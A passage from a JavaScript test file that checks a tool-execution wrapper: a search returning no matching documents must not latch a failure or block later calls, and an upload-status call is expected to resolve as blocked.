    await expect(plain.execute("getUploadStatus", {}, "b")).resolves.toMatchObject({ blocked: true });
  });

  it("does not latch a successful search with no matching documents", async () => {
    const t = setup();
    await t.execute("search", { q: "missing" });
    expect(t.failure).toBeUndefined();
    expect(() => t.throwIfBlocked()).not.toThrow();
    await t.execute("search", { q: "different phrasing" }, "next");
    expect(t.dispatch).toHaveBeenCalledTimes(2);
    expect(t.searchCalls.map(call => call.zeroHit)).toEqual([true, true]);
  });
});
